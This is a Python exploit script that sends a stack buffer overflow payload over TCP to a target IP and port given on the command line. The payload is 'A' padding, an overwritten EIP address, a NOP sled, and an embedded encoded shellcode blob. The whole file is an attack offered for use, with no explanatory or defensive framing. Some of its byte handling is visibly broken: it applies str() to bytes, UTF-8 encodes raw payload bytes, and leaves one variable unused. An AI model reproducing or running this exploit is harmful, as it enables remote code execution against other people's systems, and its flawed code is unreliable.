import socket
import struct
import argparse
import socket
import subprocess
import sys
import os

shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xbd\x96\xce\xee\x83\xee\xfc"
shellcode += b"\xe2\xf4\x41\x7e\x4c\xee\xbd\x96\xae\x67\x58"
shellcode += b"\xa7\x0e\x8a\x36\xc6\xfe\x65\xef\x9a\x45\xbc"
shellcode += b"\xa9\x1d\xbc\xc6\xb2\x21\x84\xc8\x8c\x69\x62"
shellcode += b"\xd2\xdc\xea\xcc\xc2\x9d\x57\x01\xe3\xbc\x51"
shellcode += b"\x2c\x1c\xef\xc1\x45\xbc\xad\x1d\x84\xd2\x36"
shellcode += b"\xda\xdf\x96\x5e\xde\xcf\x3f\xec\x1d\x97\xce"
shellcode += b"\xbc\x45\x45\xa7\xa5\x75\xf4\xa7\x36\xa2\x45"
shellcode += b"\xef\x6b\xa7\x31\x42\x7c\x59\xc3\xef\x7a\xae"
shellcode += b"\x2e\x9b\x4b\x95\xb3\x16\x86\xeb\xea\x9b\x59"
shellcode += b"\xce\x45\xb6\x99\x97\x1d\x88\x36\x9a\x85\x65"
shellcode += b"\xe5\x8a\xcf\x3d\x36\x92\x45\xef\x6d\x1f\x8a"
shellcode += b"\xca\x99\xcd\x95\x8f\xe4\xcc\x9f\x11\x5d\xc9"
shellcode += b"\x91\xb4\x36\x84\x25\x63\xe0\xfe\xfd\xdc\xbd"
shellcode += b"\x96\xa6\x99\xce\xa4\x91\xba\xd5\xda\xb9\xc8"
shellcode += b"\xba\x69\x1b\x56\x2d\x97\xce\xee\x94\x52\x9a"
shellcode += b"\xbe\xd5\xbf\x4e\x85\xbd\x69\x1b\xbe\xed\xc6"
shellcode += b"\x9e\xae\xed\xd6\x9e\x86\x57\x99\x11\x0e\x42"
shellcode += b"\x43\x59\x84\xb8\xfe\x0e\x46\xbd\x9a\xa6\xec"
shellcode += b"\xbd\x87\x92\x67\x5b\xfc\xde\xb8\xea\xfe\x57"
shellcode += b"\x4b\xc9\xf7\x31\x3b\x38\x56\xba\xe2\x42\xd8"
shellcode += b"\xc6\x9b\x51\xfe\x3e\x5b\x1f\xc0\x31\x3b\xd5"
shellcode += b"\xf5\xa3\x8a\xbd\x1f\x2d\xb9\xea\xc1\xff\x18"
shellcode += b"\xd7\x84\x97\xb8\x5f\x6b\xa8\x29\xf9\xb2\xf2"
shellcode += b"\xef\xbc\x1b\x8a\xca\xad\x50\xce\xaa\xe9\xc6"
shellcode += b"\x98\xb8\xeb\xd0\x98\xa0\xeb\xc0\x9d\xb8\xd5"
shellcode += b"\xef\x02\xd1\x3b\x69\x1b\x67\x5d\xd8\x98\xa8"
shellcode += b"\x42\xa6\xa6\xe6\x3a\x8b\xae\x11\x68\x2d\x3e"
shellcode += b"\x5b\x1f\xc0\xa6\x48\x28\x2b\x53\x11\x68\xaa"
shellcode += b"\xc8\x92\xb7\x16\x35\x0e\xc8\x93\x75\xa9\xae"



prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 32
padding = (5009 - len(shellcode)) * "C"
attack = prefix + eip + nopsled + str(shellcode)



#attack = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + (shellcode)


class Buffer():
    def __init__(self,TCP_IP, TCP_PORT):
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT

    def oscmd(self, cmd):
        p = subprocess.Popen(
            cmd, shell=False,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = p.communicate()
        return stdout.decode(), stderr.decode()

    def send_buffer(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.TCP_IP, self.TCP_PORT))
            print(attack)
            s.send((attack.encode('utf8')))
            s.close()
        except:
            print("Error Connection the server")
            sys.exit()

    def run(self):
        try:
            self.send_buffer()
        except Exception as e:
            print(e)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('TCP_IP', type=str, help='Specify IP of the target: e.g. 192.168.1.X')
    parser.add_argument('TCP_PORT', type=int, help='Specify Port of the target: e.g. 443')
    args = parser.parse_args()
    sm = Buffer(args.TCP_IP, args.TCP_PORT)
    sm.run()